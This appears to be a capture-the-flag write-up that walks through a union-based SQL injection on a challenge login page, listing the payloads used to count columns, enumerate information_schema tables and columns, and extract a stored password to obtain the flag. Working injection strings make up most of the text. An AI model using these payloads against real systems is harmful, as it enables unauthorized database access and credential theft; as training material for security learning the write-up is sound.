We clearly have to exploit facts.html to find the password.
Opening up the source to facts.html, we find some debugging code.
We do not know the names of the tables initially, but we can find out the number of columns
by doing:

    admin ' order by 3 LIMIT 1 -- '

This does not give us an error, but ordering by 4 does. Now if we input
anything as one, two, or three and load from information_schema.tables with

    admin ' UNION SELECT "wut" as one, "ayo" as two, "lol" as three from information_schema.tables LIMIT 1 -- '

we don't get an error. Now we know that we can load info from information_schema.tables.
However, we don't know the name of the user table or the column. To find the column, we do

    admin ' UNION SELECT "wut" as one, "ayo" as two, table_name as three from information_schema.tables order by user LIMIT 1 -- '

The output is 'lol', which means that the users column is column three. Now we know that anything we want to do
is in three.
To find the users table, we can play around a bit with the limits, but ultimately

    admin ' UNION SELECT "wut" as one, "ayo" as two, table_name as three from information_schema.tables order by user LIMIT 66, 1 -- '

is what we want. The output is "s'identifier" and we now know that that is the name of the table, which is s'identifier.
In order to find the column of the password, we can do

    admin ' UNION SELECT "wut" as one, "ayo" as two, column_name as three from information_schema.columns where table_name = "s'identifier"LIMIT 2, 1 -- '

The output is kupuhipa, which is password in Maori. We can deduce that this must be the password column.
By going back to one of our first payloads and modifying a bit, we can now get the actual password.

    admin ' UNION SELECT "wut" as one, "ayo" as two, kupuhipa from `s'identifier` as three LIMIT 1,1 -- '

(Note that the backticks are needed) This gives us the password to the login, and reveals the flag upon being
entered into the login page.
